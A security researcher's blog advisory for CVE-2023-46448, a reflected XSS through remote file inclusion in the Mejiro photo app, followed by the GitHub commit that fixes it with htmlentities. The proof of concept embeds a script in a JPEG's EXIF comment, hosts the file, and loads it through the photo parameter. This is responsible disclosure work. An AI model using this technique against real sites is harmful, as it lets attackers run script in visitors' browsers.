=== Content from blog.0xzon.dev_ca31f1f4_20250111_063935.html ===
  [![avatar](https://avatars.githubusercontent.com/u/52760493?v=4)](/)  [Aaron Haymore](/)Penetration Tester | CTF Player

* [HOME](/) * [TAGS](/tags/) * [ARCHIVES](/archives/) * [ABOUT](/about/)

      [Home](/)   Mejiro Reflected XSS Via Remote File Inclusion CVE-2023-46448   Post     Cancel
# Mejiro Reflected XSS Via Remote File Inclusion CVE-2023-46448

  Posted  *Oct 15, 2023*    By  *[Aaron Haymore](https://github.com/0xZon)*    *5 min* read  `| ``` 1 2 3 4 5  ```  ``` Title: Mejiro Reflected XSS Via Remote File Inclusion Risk: 6.1 Medium CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N Versions Affected: Before commit 3096393 Identifier: CVE-2023-46448 Authors: Aaron Haymore  ``` | |
| --- | --- |`
## Summary

I have identified a reflected cross-site scripting (XSS) vulnerability in a GitHub project known as Mejiro, which is an open-source photo publishing application. This XSS vulnerability can be exploited due to two critical factors. The first factor involves how `index.php` loads photos, while the second factor pertains to how the application processes metadata.

## Details

The core of the vulnerability lies within `index.php`. As seen from the code below, the application is extracting metadata using `exif` and saving them to their respective variables.

  `| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  ```  ``` // Get aperture, exposure, iso, and datetime from EXIF $aperture = (is_null($exif['COMPUTED']['ApertureFNumber']) ? null : $exif['COMPUTED']['ApertureFNumber']); $exposure = (is_null($exif['EXIF']['ExposureTime']) ? null : $exif['EXIF']['ExposureTime']); // Normalize exposure // https://stackoverflow.com/questions/3049998/parsing-exifs-exposuretime-using-php if (!is_null($exposure)) { 	$parts = explode("/", $exposure); 	if (($parts[1] % $parts[0]) == 0 || $parts[1] == 1000000) { 		$exposure = ' &bull; 1/' . round($parts[1] / $parts[0], 0); 	} else { 		if ($parts[1] == 1) { 			$exposure = ' &bull; ' . $parts[0]; 		} else { 			$exposure = ' &bull; ' . $parts[0] . '/' . $parts[1]; 		} 	} } $iso = (is_null($exif['EXIF']['ISOSpeedRatings']) ? null : " &bull; " . $exif['EXIF']['ISOSpeedRatings']); $datetime = $exif['EXIF']['DateTimeOriginal'] ?? null; $comment = $exif['COMMENT']['0'] ?? null;  ``` | |
| --- | --- |`

A little further down in `index.php`, you can see how this information and photo are displayed to the user. It outputs each of the variables taken from above to the webpage.

  `| ``` 1 2 3 4 5 6 7 8  ```  ``` // Show photo, EXIF data, description, and info // Enable the download link if $download = true $raw = (!empty($raw_file[0]) ? '&raw=' .  $raw_file[0] : null); if ($download) { 	echo '<div class="center"><a href="' . htmlentities($file) . '" download><img style="max-width: 100%; border-radius: 7px;" src="' . htmlentities($tim) . '" alt="' . $file_path['filename'] . '" title="' . $file_path['filename'] . '"></a><div class="caption">' . $comment . ' ' . $description . '</div><div class="caption">' . $exif_info . '<a href="delete.php?file=' . $file . $raw . '"><img style="margin-left: 1em;" src="svg/bin.svg" alt="' . L::img_delete . '" title="' . L::img_delete . '" /></a></div>'; } else { 	echo '<div class="center"><img style="max-width: 100%; border-radius: 7px;" src="' . htmlentities($tim) . '" alt="' . $file_path['filename'] . '" title="' . $file_path['filename'] . '"><div class="caption">' . $comment . ' ' . $description . '</div><div class="caption">' . $exif_info . '<a href="delete.php?file=' . $file . $raw . '"><img style="margin-left: 1em;" src="svg/remove-image.svg" alt="' . L::img_delete . '" title="' . L::img_delete . '" /></a></div>'; }  ``` | |
| --- | --- |`

Notice that there is no sanitization between when the data is extracted and displayed to the user. Input sanitization, also known as input validation, is the process of inspecting and cleaning data received from untrusted or unvalidated sources to ensure it is safe. The primary goal of input sanitization is to protect against malicious injection-type attacks.

As an attacker, if I can manipulate variables like `$comment`, `$description`, or any other field within `$exif_info`, it could result in a cross-site scripting vulnerability. This bug alone does not have an impact because all the photos here are controlled by the author. There is no upload function; they have to be manually placed on the file system.

However, I was able to find a remote file inclusion vulnerability in `index.php` on the `photo` variable (it is worth noting that LFI was not possible and it would only load images). By exploiting this vulnerability, I was able to host a malicious file that contained embedded JavaScript within its metadata. When the application processes my malicious file, it extracts the JavaScript, executing it when someone visits the page.

  `| ``` 1  ```  ``` $file = (isset($_GET['photo']) ? $_GET['photo'] : null);  ``` | |
| --- | --- |`
## Proof Of Concept

To illustrate the exploit, I injected a malicious payload into a seemingly innocent ‘dog.jpg’ file:

  `| ``` 1 2  ```  ``` [zonifer@dell Sandbox]$ exiftool -Comment='<script>alert("XSS")</script>' dog.jpg     1 image files updated  ``` | |
| --- | --- |`

Next, I hosted the payload on a basic `python3` web server:

  `| ``` 1 2 3  ```  ``` [zonifer@dell Sandbox]$ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.1.17 - - [09/Oct/2023 00:33:12] "GET /dog.jpg HTTP/1.0" 200 -  ``` | |
| --- | --- |`

To trigger the XSS, I navigated to:

`http://10.10.1.17/mejiro/index.php?all=1&photo=http://10.50.1.2/dog.jpg`

As a result, the XSS payload executed as expected. [![CVE-2022-27475]()](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/20231009003326.png)

## Patch

To patch this vulnerability, the simplest solution is to utilize `htmlentities`. `htmlentities` is a PHP function used to convert special characters in a string to their respective HTML entities.

For example, characters like `<`, `>`, `&`, and double quotes `"` have special meanings in HTML. If they are not properly escaped, malicious users can inject code into web pages. `htmlentities` replaces these characters with their HTML entity equivalents, making it safe to display content on a webpage.

As an example, a malicious script to spawn an alert box would be:

  `| ``` 1  ```  ``` <script>alert("XSS")</script>  ``` | |
| --- | --- |`

After processing it through `htmlentities`, it would be:

  `| ``` 1  ```  ``` `&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;`  ``` | |
| --- | --- |`

You can view the fix [here](https://github.com/dmpop/mejiro/commit/309639339f5816408865902befe8c90cb6862537), It essentially does what is just described above. It takes each of the EXIF data fields and processes it through `htmlentities` to strip away any possibility of malicious JavaScript.

## Report Timeline

  `| ``` 1 2 3 4  ```  ``` 10-9-2023: Vulnerability discovered and reported to the author. 10-10-2023: The author acknowledged the report and asked for suggestions to fix the issue. 10-10-2023: Response provided to the author, suggesting ways to fix the vulnerability. 10-15-2023: The patch was successfully pushed  ``` | |
| --- | --- |`
## Conclusion

The Reflected XSS vulnerability in Mejiro underscores the importance of thorough security testing in web applications. It serves as a reminder that even seemingly benign elements, such as image metadata, can be exploited by malicious actors to compromise the security of a system. The timely response of the Mejiro development team in implementing the suggested patch is commendable and highlights the importance of collaboration in ensuring the security of web applications. By addressing such vulnerabilities proactively, we contribute to a safer and more reliable digital landscape.

  [CVE](/tags/cve/) This post is licensed under  [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/)  by the author. Share       Recently Updated

* [Creating POC's For New CVE's](/2024-12-13-Creating-POCs-For-New-CVEs/)* [Arsenal Assembly](/2024-10-19-ArsenalAssembly/)* [HTTP Redirector With Havoc](/2024-07-14-HTTP-Redirector-With-Havoc/)* [VulnHub Mr.Robot Writeup](/2024-09-03-VulnHub-MrRobot/)* [VulnHub Zico2 Writeup](/2024-09-01-VulnHub-Zico2/)
Trending Tags [HTB](/tags/htb/) [CVE](/tags/cve/) [EASY](/tags/easy/) [OSCP](/tags/oscp/) [PG](/tags/pg/) [VulnHub](/tags/vulnhub/) [GUIDE](/tags/guide/) [AD](/tags/ad/) [Blog Post](/tags/blog-post/) [Challenge](/tags/challenge/)Contents
### Further Reading

  [*Jul 27, 2024*
### CVE-2024-41637

CVE-2024-41637 1 2 3 4 5 Title: RaspAP Local Privilege Escalation Risk: 9.9 Critical CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H Versions Affected: Before Versions 3.1.5 Identifier: CVE-2024-4163...](/2024-07-27-CVE-2024-41637/)  [*Apr 10, 2022*
### CVE-2022-27475

CVE-2022-27475 While looking at some open source projects on github I came across this hotel management software. The webapp is used to create reservations for a hotel. I decided to downlaod it an...](/2022-04-10-CVE-2022-27475/)  [*Oct 18, 2023*
### SSRF Explained And- xploited

Description Server Side Request Forgery (SSRF) is a malicious web attack that enables an attacker to manipulate a server into making unintended HTTP requests to internal or external resources. In a...](/2023-10-18-SSRF-Explained-And-Exploited/) [HTB PC Writeup](/2023-10-07-HTB-PC/) [SSRF Explained And- xploited](/2023-10-18-SSRF-Explained-And-Exploited/)Trending Tags [HTB](/tags/htb/) [CVE](/tags/cve/) [EASY](/tags/easy/) [OSCP](/tags/oscp/) [PG](/tags/pg/) [VulnHub](/tags/vulnhub/) [GUIDE](/tags/guide/) [AD](/tags/ad/) [Blog Post](/tags/blog-post/) [Challenge](/tags/challenge/)

© 2024 [Aaron Haymore](https://github.com/0xZon). Some rights reserved.

Powered by [Jekyll](https://jekyllrb.com) with [Chirpy](https://github.com/cotes2020/jekyll-theme-chirpy) theme.

  ×

A new version of content is available.

 Update


=== Content from github.com_00b646ee_20250111_063936.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdmpop%2Fpellicola%2Fcommit%2F309639339f5816408865902befe8c90cb6862537)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdmpop%2Fpellicola%2Fcommit%2F309639339f5816408865902befe8c90cb6862537)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=dmpop%2Fpellicola)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dmpop](/dmpop)
/
**[pellicola](/dmpop/pellicola)**
Public

* [Notifications](/login?return_to=%2Fdmpop%2Fpellicola) You must be signed in to change notification settings
* [Fork
  17](/login?return_to=%2Fdmpop%2Fpellicola)
* [Star
   168](/login?return_to=%2Fdmpop%2Fpellicola)

* [Code](/dmpop/pellicola)
* [Issues
  0](/dmpop/pellicola/issues)
* [Pull requests
  0](/dmpop/pellicola/pulls)
* [Actions](/dmpop/pellicola/actions)
* [Projects
  0](/dmpop/pellicola/projects)
* [Security](/dmpop/pellicola/security)
* [Insights](/dmpop/pellicola/pulse)

Additional navigation options

* [Code](/dmpop/pellicola)
* [Issues](/dmpop/pellicola/issues)
* [Pull requests](/dmpop/pellicola/pulls)
* [Actions](/dmpop/pellicola/actions)
* [Projects](/dmpop/pellicola/projects)
* [Security](/dmpop/pellicola/security)
* [Insights](/dmpop/pellicola/pulse)

## Commit

[Permalink](/dmpop/pellicola/commit/309639339f5816408865902befe8c90cb6862537)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix reflected XSS vulnerability

[Browse files](/dmpop/pellicola/tree/309639339f5816408865902befe8c90cb6862537)
Browse the repository at this point in the history

* Loading branch information

Dmitri Popov
committed
Oct 15, 2023

1 parent
[0c835bd](/dmpop/pellicola/commit/0c835bd1d9c0805ab35c345abe661b794d39eecd)

commit 3096393

Showing
**1 changed file**
with
**10 additions**
and
**10 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

20 changes: 10 additions & 10 deletions

20
[index.php](#diff-7413d6453f901e939bbd840c8f0d1c7b20c2ca0e7f71741e4e07c6cf036f16c0 "index.php")

Show comments

[View file](/dmpop/pellicola/blob/309639339f5816408865902befe8c90cb6862537/index.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -97,8 +97,8 @@ function read\_gps\_location($file) |
|  |  | $GPSLongitudeRef == 'w' ? $lon \*= -1 : ''; |
|  |  |  |
|  |  | return array( |
|  |  | 'lat' => $lat, |
|  |  | 'lon' => $lon |
|  |  | 'lat' => htmlentities($lat), |
|  |  | 'lon' => htmlentities($lon) |
|  |  | ); |
|  |  | } |
|  |  | } |
| Expand Down  Expand Up | | @@ -364,25 +364,25 @@ function show\_pagination($current\_page, $last\_page, $and\_d, $sub\_photo\_dir) |
|  |  | $gps = read\_gps\_location($file); |
|  |  |  |
|  |  | // Get aperture, exposure, iso, and datetime from EXIF |
|  |  | $aperture = (is\_null($exif['COMPUTED']['ApertureFNumber']) ? null : $exif['COMPUTED']['ApertureFNumber']); |
|  |  | $exposure = (is\_null($exif['EXIF']['ExposureTime']) ? null : $exif['EXIF']['ExposureTime']); |
|  |  | $aperture = htmlentities((is\_null($exif['COMPUTED']['ApertureFNumber']) ? null : $exif['COMPUTED']['ApertureFNumber'])); |
|  |  | $exposure = htmlentities((is\_null($exif['EXIF']['ExposureTime']) ? null : $exif['EXIF']['ExposureTime'])); |
|  |  | // Normalize exposure |
|  |  | // https://stackoverflow.com/questions/3049998/parsing-exifs-exposuretime-using-php |
|  |  | if (!is\_null($exposure)) { |
|  |  | $parts = explode("/", $exposure); |
|  |  | if (($parts[1] % $parts[0]) == 0 || $parts[1] == 1000000) { |
|  |  | $exposure = ' &bull; 1/' . round($parts[1] / $parts[0], 0); |
|  |  | $exposure = htmlentities(' &bull; 1/' . round($parts[1] / $parts[0], 0)); |
|  |  | } else { |
|  |  | if ($parts[1] == 1) { |
|  |  | $exposure = ' &bull; ' . $parts[0]; |
|  |  | $exposure = htmlentities(' &bull; ' . $parts[0]); |
|  |  | } else { |
|  |  | $exposure = ' &bull; ' . $parts[0] . '/' . $parts[1]; |
|  |  | $exposure = htmlentities(' &bull; ' . $parts[0] . '/' . $parts[1]); |
|  |  | } |
|  |  | } |
|  |  | } |
|  |  | $iso = (is\_null($exif['EXIF']['ISOSpeedRatings']) ? null : " &bull; " . $exif['EXIF']['ISOSpeedRatings']); |
|  |  | $datetime = $exif['EXIF']['DateTimeOriginal'] ?? null; |
|  |  | $comment = $exif['COMMENT']['0'] ?? null; |
|  |  | $iso = htmlentities((is\_null($exif['EXIF']['ISOSpeedRatings']) ? null : " &bull; " . $exif['EXIF']['ISOSpeedRatings'])); |
|  |  | $datetime = htmlentities($exif['EXIF']['DateTimeOriginal']) ?? null; |
|  |  | $comment = htmlentities($exif['COMMENT']['0']) ?? null; |
|  |  |  |
|  |  | // Concatenate $exif\_info |
|  |  | if (!is\_null($aperture) || !is\_null($exposure) || !is\_null($iso) || !is\_null($datetime)) { |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `3096393`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdmpop%2Fpellicola%2Fcommit%2F309639339f5816408865902befe8c90cb6862537) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


